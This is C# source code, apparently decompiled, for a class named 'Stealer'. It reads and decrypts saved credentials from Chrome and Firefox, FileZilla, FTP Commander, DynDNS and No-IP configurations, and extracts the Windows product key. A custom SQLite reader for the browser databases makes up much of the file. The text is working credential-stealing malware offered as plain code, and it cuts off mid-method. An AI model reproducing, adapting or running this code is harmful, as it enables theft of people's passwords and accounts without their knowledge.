using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using JSONSerializer;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

internal class Stealer
{
	public class GoogleChrome
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			checked
			{
				try
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
					if (File.Exists(text))
					{
						SQLite sQLite = new SQLite(text);
						sQLite.ReadTable("logins");
						int num = sQLite.GetRowCount() - 1;
						for (int i = 0; i <= num; i++)
						{
							passwords.Add(sQLite.GetValue(i, "origin_url"), sQLite.GetValue(i, "username_value"), Decrypt(sQLite.GetValue(i, "password_value")), PasswordSource.GoogleChrome);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return passwords;
			}
		}

		private static string Decrypt(string data)
		{
			checked
			{
				try
				{
					API.DATA_BLOB pDataIn = default(API.DATA_BLOB);
					GCHandle gCHandle = GCHandle.Alloc(Encoding.Default.GetBytes(data), GCHandleType.Pinned);
					pDataIn.pbData = gCHandle.AddrOfPinnedObject();
					pDataIn.cbData = data.Length;
					gCHandle.Free();
					API.DATA_BLOB pDataOut = default(API.DATA_BLOB);
					API.CryptUnprotectDataDelegate cryptUnprotectData = API.CryptUnprotectData;
					API.DATA_BLOB dATA_BLOB = default(API.DATA_BLOB);
					API.DATA_BLOB pOptionalEntropy = dATA_BLOB;
					object pPromptStruct = null;
					IntPtr pvReserved = default(IntPtr);
					cryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
					byte[] array = new byte[pDataOut.cbData + 1];
					Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
					string @string = Encoding.Default.GetString(array);
					return @string.Substring(0, @string.Length - 1);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string empty = string.Empty;
					ProjectData.ClearProjectError();
					return empty;
				}
			}
		}
	}

	public class MozillaFirefox
	{
		private delegate long NSS_InitDelegate(string configdir);

		public delegate long PK11_GetInternalKeySlotDelegate();

		private delegate long PK11_AuthenticateDelegate(long slot, bool loadCerts, long wincx);

		private delegate int NSSBase64_DecodeBufferDelegate(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		private delegate int PK11SDR_DecryptDelegate(ref TSECItem data, ref TSECItem result, int cx);

		private struct TSECItem
		{
			public int SECItemType;

			public int SECItemData;

			public int SECItemLen;
		}

		private static NSS_InitDelegate NSS_Init;

		private static PK11_GetInternalKeySlotDelegate PK11_GetInternalKeySlot;

		private static PK11_AuthenticateDelegate PK11_Authenticate;

		private static NSSBase64_DecodeBufferDelegate NSSBase64_DecodeBuffer;

		private static PK11SDR_DecryptDelegate PK11SDR_Decrypt;

		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			checked
			{
				try
				{
					string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
					if (Directory.Exists(path))
					{
						DirectoryInfo[] directories = new DirectoryInfo(path).GetDirectories();
						foreach (DirectoryInfo directoryInfo in directories)
						{
							if (File.Exists(directoryInfo.FullName + "\\signons.sqlite"))
							{
								SQLite sQLite = new SQLite(directoryInfo.FullName + "\\signons.sqlite");
								sQLite.ReadTable("moz_logins");
								int num = sQLite.GetRowCount() - 1;
								for (int j = 0; j <= num; j++)
								{
									passwords.Add(sQLite.GetValue(j, "formSubmitURL"), Decrypt(directoryInfo.FullName, sQLite.GetValue(j, "encryptedUsername")), Decrypt(directoryInfo.FullName, sQLite.GetValue(j, "encryptedPassword")), PasswordSource.MozillaFirefox);
								}
							}
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return passwords;
			}
		}

		private static string Decrypt(string profile, string data)
		{
			string result = string.Empty;
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Mozilla Firefox\\";
				if (!Directory.Exists(text))
				{
					return string.Empty;
				}
				API.Dynamic.LoadLibrary(text + "mozglue.dll");
				IntPtr library = API.Dynamic.LoadLibrary(text + "nss3.dll");
				NSS_Init = API.Dynamic.CreateMethod<NSS_InitDelegate>(library, "NSS_Init");
				PK11_GetInternalKeySlot = API.Dynamic.CreateMethod<PK11_GetInternalKeySlotDelegate>(library, "PK11_GetInternalKeySlot");
				PK11_Authenticate = API.Dynamic.CreateMethod<PK11_AuthenticateDelegate>(library, "PK11_Authenticate");
				NSSBase64_DecodeBuffer = API.Dynamic.CreateMethod<NSSBase64_DecodeBufferDelegate>(library, "NSSBase64_DecodeBuffer");
				PK11SDR_Decrypt = API.Dynamic.CreateMethod<PK11SDR_DecryptDelegate>(library, "PK11SDR_Decrypt");
				NSS_Init(profile);
				PK11_Authenticate(PK11_GetInternalKeySlot(), loadCerts: true, 0L);
				TSECItem result2 = default(TSECItem);
				PK11SDR_DecryptDelegate pK11SDR_Decrypt = PK11SDR_Decrypt;
				IntPtr ptr = new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, new StringBuilder(data), data.Length));
				object? obj = Marshal.PtrToStructure(ptr, typeof(TSECItem));
				TSECItem tSECItem = default(TSECItem);
				TSECItem data2 = ((obj != null) ? ((TSECItem)obj) : tSECItem);
				if (pK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
				{
					byte[] array = new byte[checked(result2.SECItemLen - 1 + 1)];
					ptr = new IntPtr(result2.SECItemData);
					Marshal.Copy(ptr, array, 0, result2.SECItemLen);
					result = Encoding.UTF8.GetString(array);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	public class FileZilla
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla";
				if (Directory.Exists(text))
				{
					if (File.Exists(text + "\\sitemanager.xml"))
					{
						passwords.AddRange(ReadValues(text + "\\sitemanager.xml"));
					}
					if (File.Exists(text + "\\recentservers.xml"))
					{
						passwords.AddRange(ReadValues(text + "\\recentservers.xml"));
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return passwords;
		}

		private static Passwords ReadValues(string path)
		{
			Passwords passwords = new Passwords();
			string host = string.Empty;
			string username = string.Empty;
			string password = string.Empty;
			using (XmlReader xmlReader = XmlReader.Create(path))
			{
				while (xmlReader.Read())
				{
					switch (xmlReader.Name)
					{
					case "Host":
						host = xmlReader.ReadString();
						break;
					case "User":
						username = xmlReader.ReadString();
						break;
					case "Pass":
						password = xmlReader.ReadString();
						break;
					case "Logontype":
						passwords.Add(host, username, password, PasswordSource.FileZilla);
						break;
					}
				}
			}
			return passwords;
		}
	}

	public class FTPCommander
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			try
			{
				string path = GetPath();
				if (!string.IsNullOrEmpty(path))
				{
					string input = File.ReadAllText(path);
					string pattern = ";Server=(?<server>.*?);Port=(?<port>.*?);Password=(?<password>.*?);User=(?<username>.*?);";
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = Regex.Matches(input, pattern).GetEnumerator();
						while (enumerator.MoveNext())
						{
							Match match = (Match)enumerator.Current;
							passwords.Add(match.Groups["server"].ToString() + ":" + match.Groups["port"].ToString(), match.Groups["username"].ToString(), Decrypt(match.Groups["password"].ToString()), PasswordSource.FtpCommander);
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return passwords;
		}

		private static string Decrypt(string data)
		{
			string text = string.Empty;
			try
			{
				int i = 0;
				for (int length = data.Length; i < length; i = checked(i + 1))
				{
					char c = data[i];
					text += Conversions.ToString(Strings.ChrW(c ^ 0x19));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return text;
		}

		private static string GetPath()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
			string[] array = new string[3]
			{
				"C:\\cftp\\Ftplist.txt",
				folderPath + "\\cftp\\Ftplist.txt",
				folderPath + "\\FTP Commander Deluxe\\Ftplist.txt"
			};
			string[] array2 = array;
			int num = 0;
			string text;
			while (true)
			{
				if (num < array2.Length)
				{
					text = array2[num];
					if (File.Exists(text))
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return string.Empty;
			}
			return text;
		}
	}

	public class DynDNS
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			try
			{
				string path = GetPath();
				if (!string.IsNullOrEmpty(path))
				{
					string input = File.ReadAllText(path);
					string pattern = "\\[account\\..*?\\]\r\nusername = (?<username>.*?)\r\nlast_checked = .*?\r\nlast_updated = .*?\r\nupdate_status = .*?\r\nstatus = .*?\r\npassword = (?<password>.*?)\r\n";
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = Regex.Matches(input, pattern).GetEnumerator();
						while (enumerator.MoveNext())
						{
							Match match = (Match)enumerator.Current;
							passwords.Add("http://dyn.com/dns/", match.Groups["username"].ToString(), Decrypt(match.Groups["password"].ToString()), PasswordSource.DynDNS);
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return passwords;
		}

		private static string Decrypt(string data)
		{
			return string.Empty;
		}

		private static string GetPath()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
			string[] array = new string[2]
			{
				folderPath + "\\Dyn\\Updater\\daemon.cfg",
				folderPath + "\\Dyn\\Updater\\config.dyndns"
			};
			string[] array2 = array;
			int num = 0;
			string text;
			while (true)
			{
				if (num < array2.Length)
				{
					text = array2[num];
					if (File.Exists(text))
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return string.Empty;
			}
			return text;
		}
	}

	public class NoIP
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Vitalwerks\\DUC\\v4", writable: false);
				string text = Decrypt(RuntimeHelpers.GetObjectValue(registryKey.GetValue("UserName")));
				string text2 = Decrypt(RuntimeHelpers.GetObjectValue(registryKey.GetValue("CKey")));
				if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text2))
				{
					passwords.Add("https://www.noip.com/", text, text2, PasswordSource.NoIP);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return passwords;
		}

		private static string Decrypt(object data)
		{
			return string.Empty;
		}
	}

	public class WindowsKey
	{
		public static Passwords Steal()
		{
			Passwords passwords = new Passwords();
			try
			{
				string text = string.Empty;
				string username = string.Empty;
				string text2 = "BCDFGHJKMPQRTVWXY2346789";
				byte[] array = new byte[16];
				int num = 0;
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false))
				{
					Array.ConstrainedCopy((byte[])registryKey.GetValue("DigitalProductID"), 52, array, 0, 15);
					username = registryKey.GetValue("ProductID")!.ToString();
				}
				int num2 = 28;
				do
				{
					if (checked(num2 + 1) % 6 != 0)
					{
						num = 0;
						int num3 = 14;
						checked
						{
							do
							{
								int num4 = (int)((long)Math.Round((double)num * 256.0) | array[num3]);
								array[num3] = (byte)unchecked(num4 / 24);
								num = unchecked(num4 % 24);
								num3 += -1;
							}
							while (num3 >= 0);
							text += Conversions.ToString(text2[num]);
						}
					}
					else
					{
						text += "-";
					}
					num2 = checked(num2 + -1);
				}
				while (num2 >= 0);
				text = Strings.StrReverse(text);
				passwords.Add(Environment.MachineName + "\\" + Environment.UserName, username, text, PasswordSource.WindowsKey);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return passwords;
		}
	}

	private class SQLite
	{
		private struct record_header_field
		{
			public long size;

			public long type;
		}

		private struct table_entry
		{
			public long row_id;

			public string[] content;
		}

		private struct sqlite_master_entry
		{
			public long row_id;

			public string item_type;

			public string item_name;

			public string astable_name;

			public long root_num;

			public string sql_statement;
		}

		private byte[] db_bytes;

		private ushort page_size;

		private ulong encoding;

		private sqlite_master_entry[] master_table_entries;

		private byte[] SQLDataTypeSize;

		private table_entry[] table_entries;

		private string[] field_names;

		private long[] Field_Size;

		private string[] retVal;

		public bool ReadTable(string TableName)
		{
			checked
			{
				try
				{
					int num = -1;
					int num2 = master_table_entries.Length;
					for (int i = 0; i <= num2; i++)
					{
						if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
						{
							num = i;
							break;
						}
					}
					if (num == -1)
					{
						return false;
					}
					string[] array = master_table_entries[num].sql_statement.Substring(master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[1] { ',' });
					int num3 = array.Length - 1;
					for (int j = 0; j <= num3; j++)
					{
						array[j] = Strings.LTrim(array[j]);
						int num4 = array[j].IndexOf(" ");
						if (num4 > 0)
						{
							array[j] = array[j].Substring(0, num4);
						}
						if (array[j].IndexOf("UNIQUE") == 0)
						{
							break;
						}
						field_names = (string[])Utils.CopyArray((Array)field_names, (Array)new string[j + 1]);
						field_names[j] = array[j];
					}
					return ReadTableFromOffset((ulong)((master_table_entries[num].root_num - 1L) * unchecked((long)page_size)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					bool result = false;
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public int GetRowCount()
		{
			return table_entries.Length;
		}

		public string GetValue(int row_num, int field)
		{
			try
			{
				if (row_num >= table_entries.Length)
				{
					return null;
				}
				if (field >= table_entries[row_num].content.Length)
				{
					return null;
				}
				return table_entries[row_num].content[field];
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string empty = string.Empty;
				ProjectData.ClearProjectError();
				return empty;
			}
		}

		public string GetValue(int row_num, string field)
		{
			try
			{
				int num = -1;
				int num2 = field_names.Length;
				for (int i = 0; i <= num2; i = checked(i + 1))
				{
					if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return null;
				}
				return GetValue(row_num, num);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string empty = string.Empty;
				ProjectData.ClearProjectError();
				return empty;
			}
		}

		public string[] GetTableNames()
		{
			checked
			{
				try
				{
					int num = 0;
					int num2 = master_table_entries.Length - 1;
					for (int i = 0; i <= num2; i++)
					{
						if (Operators.CompareString(master_table_entries[i].item_type, "table", false) == 0)
						{
							retVal = (string[])Utils.CopyArray((Array)retVal, (Array)new string[num + 1]);
							retVal[num] = master_table_entries[i].item_name;
							num++;
						}
					}
					return retVal;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string[] array = new string[0];
					string[] result = array;
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoOptimization)]
		public SQLite(string baseName)
		{
			SQLDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
			Field_Size = new long[5];
			checked
			{
				try
				{
					if (File.Exists(baseName))
					{
						FileSystem.FileOpen(1, baseName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						string s = Strings.Space((int)FileSystem.LOF(1));
						FileSystem.FileGet(1, ref s, -1L, false);
						FileSystem.FileClose(new int[1] { 1 });
						db_bytes = Encoding.Default.GetBytes(s);
						page_size = (ushort)ConvertToInteger(16, 2);
						encoding = ConvertToInteger(56, 4);
						if (decimal.Compare(new decimal(encoding), 0m) == 0)
						{
							encoding = 1uL;
						}
						ReadMasterTable(100uL);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private int GVL(int startIndex)
		{
			checked
			{
				try
				{
					if (startIndex > db_bytes.Length)
					{
						return 0;
					}
					int num = startIndex + 8;
					int num2 = startIndex;
					while (true)
					{
						if (num2 <= num)
						{
							if (num2 <= db_bytes.Length - 1)
							{
								if ((db_bytes[num2] & 0x80) != 128)
								{
									break;
								}
								num2++;
								continue;
							}
							return 0;
						}
						return startIndex + 8;
					}
					return num2;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					int result = 0;
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		private long CVL(int startIndex, int endIndex)
		{
			checked
			{
				try
				{
					endIndex++;
					byte[] array = new byte[8];
					int num = endIndex - startIndex;
					bool flag = false;
					if (unchecked(num == 0 || num > 9))
					{
						return 0L;
					}
					switch (num)
					{
					case 1:
						array[0] = (byte)(db_bytes[startIndex] & 0x7F);
						return BitConverter.ToInt64(array, 0);
					case 9:
						flag = true;
						break;
					}
					int num2 = 1;
					int num3 = 7;
					int num4 = 0;
					if (flag)
					{
						array[0] = db_bytes[endIndex - 1];
						endIndex--;
						num4 = 1;
					}
					for (int i = endIndex - 1; i >= startIndex; i += -1)
					{
						if (i - 1 >= startIndex)
						{
							array[num4] = (byte)unchecked(((byte)((uint)db_bytes[i] >> (checked(num2 - 1) & 7)) & (255 >> num2)) | (byte)(db_bytes[checked(i - 1)] << (num3 & 7)));
							num2++;
							num4++;
							num3--;
						}
						else if (!flag)
						{
							array[num4] = (byte)(unchecked((byte)((uint)db_bytes[i] >> (checked(num2 - 1) & 7))) & (255 >> num2));
						}
					}
					return BitConverter.ToInt64(array, 0);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					long result = 0L;
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		private bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		private ulong ConvertToInteger(int startIndex, int Size)
		{
			try
			{
				if (Size > 8 || Size == 0)
				{
					return 0uL;
				}
				ulong num = 0uL;
				checked
				{
					int num2 = Size - 1;
					for (int i = 0; i <= num2; i++)
					{
						num = (num << 8) | db_bytes[startIndex + i];
					}
					return num;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ulong result = 0uL;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private void ReadMasterTable(ulong Offset)
		{
			checked
			{
				try
				{
					if (db_bytes[(int)Offset] == 13)
					{
						ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
						int num2 = 0;
						if (master_table_entries != null)
						{
							num2 = master_table_entries.Length;
							master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)master_table_entries, (Array)new sqlite_master_entry[master_table_entries.Length + unchecked((int)num) + 1]);
						}
						else
						{
							master_table_entries = new sqlite_master_entry[unchecked((int)num) + 1];
						}
						int num3 = num;
						for (int i = 0; i <= num3; i++)
						{
							ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(8L)), new decimal(i * 2))), 2);
							if (decimal.Compare(new decimal(Offset), new decimal(100L)) != 0)
							{
								num4 += Offset;
							}
							int num5 = GVL((int)num4);
							CVL((int)num4, num5);
							int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
							master_table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
							num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
							num5 = GVL((int)num4);
							num6 = num5;
							long value = CVL((int)num4, num5);
							int num7 = 0;
							do
							{
								num5 = num6 + 1;
								num6 = GVL(num5);
								Field_Size[num7] = CVL(num5, num6);
								if (Field_Size[num7] <= 9L)
								{
									Field_Size[num7] = SQLDataTypeSize[(int)Field_Size[num7]];
								}
								else if (IsOdd(Field_Size[num7]))
								{
									Field_Size[num7] = (long)Math.Round((double)(Field_Size[num7] - 13L) / 2.0);
								}
								else
								{
									Field_Size[num7] = (long)Math.Round((double)(Field_Size[num7] - 12L) / 2.0);
								}
								num7++;
							}
							while (num7 <= 4);
							if (decimal.Compare(new decimal(encoding), 1m) == 0)
							{
								master_table_entries[num2 + i].item_type = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)Field_Size[0]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
							{
								master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)Field_Size[0]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
							{
								master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)Field_Size[0]);
							}
							if (decimal.Compare(new decimal(encoding), 1m) == 0)
							{
								master_table_entries[num2 + i].item_name = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
							{
								master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
							{
								master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0]))), (int)Field_Size[1]);
							}
							master_table_entries[num2 + i].root_num = (long)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2]))), (int)Field_Size[3]);
							if (decimal.Compare(new decimal(encoding), 1m) == 0)
							{
								master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
							{
								master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
							}
							else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
							{
								master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(Field_Size[0])), new decimal(Field_Size[1])), new decimal(Field_Size[2])), new decimal(Field_Size[3]))), (int)Field_Size[4]);
							}
						}
					}
					else
					{
						if (db_bytes[(int)Offset] != 5)
						{
							return;
						}
						ushort num8 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
						int num9 = num8;
						for (int j = 0; j <= num9; j++)
						{
							ushort num10 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(12L)), new decimal(j * 2))), 2);
							if (decimal.Compare(new decimal(Offset), new decimal(100L)) == 0)
							{
								ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(num10, 4)), 1m), new decimal(page_size))));
							}
							else
							{
								ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num10), 4)), 1m), new decimal(page_size))));
							}
						}
						ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(8L))), 4)), 1m), new decimal(page_size))));
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private bool ReadTableFromOffset(ulong Offset)
		{
			checked
			{
				try
				{
					if (db_bytes[(int)Offset] == 13)
					{
						ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
						int num2 = 0;
						if (table_entries != null)
						{
							num2 = table_entries.Length;
							table_entries = (table_entry[])Utils.CopyArray((Array)table_entries, (Array)new table_entry[table_entries.Length + unchecked((int)num) + 1]);
						}
						else
						{
							table_entries = new table_entry[unchecked((int)num) + 1];
						}
						int num3 = num;
						for (int i = 0; i <= num3; i++)
						{
							ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(8L)), new decimal(i * 2))), 2);
							if (decimal.Compare(new decimal(Offset), new decimal(100L)) != 0)
							{
								num4 += Offset;
							}
							int num5 = GVL((int)num4);
							CVL((int)num4, num5);
							int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
							table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
							num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
							num5 = GVL((int)num4);
							num6 = num5;
							long num7 = CVL((int)num4, num5);
							record_header_field[] array = new record_header_field[0];
							long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
							int num9 = 0;
							while (num8 < num7)
							{
								array = (record_header_field[])Utils.CopyArray((Array)array, (Array)new record_header_field[num9 + 1]);
								num5 = num6 + 1;
								num6 = GVL(num5);
								array[num9].type = CVL(num5, num6);
								if (array[num9].type > 9L)
								{
									if (IsOdd(array[num9].type))
									{
										array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
									}
									else
									{
										array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
									}
								}
								else
								{
									array[num9].size = SQLDataTypeSize[(int)array[num9].type];
								}
								num8 = num8 + (num6 - num5) + 1L;
								num9++;
							}
							table_entries[num2 + i].content = new string[array.Length - 1 + 1];
							int num10 = 0;
							int num11 = array.Length - 1;
							for (int j = 0; j <= num11; j++)
							{
								if (array[j].type > 9L)
								{
									if (!IsOdd(array[j].type))
									{
										if (decimal.Compare(new decimal(encoding), 1m) == 0)
										{
											table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
										}
										else if (decimal.Compare(new decimal(encoding), new decimal(2L)) == 0)
										{
											table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
										}
										else if (decimal.Compare(new decimal(encoding), new decimal(3L)) == 0)
										{
											table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
										}
									}
									else
									{
										table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
									}
								}
								else
								{
									table_entries[num2 + i].content[j] = Conversions.ToString(ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size));
								}
								num10 = (int)(num10 + array[j].size);
							}
						}
					}
					else if (db_bytes[(int)Offset] == 5)
					{
						ushort num12 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(3L))), 2)), 1m));
						int num13 = num12;
						for (int k = 0; k <= num13; k++)
						{
							ushort num14 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), new decimal(12L)), new decimal(k * 2))), 2);
							ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num14), 4)), 1m), new decimal(page_size))));
						}
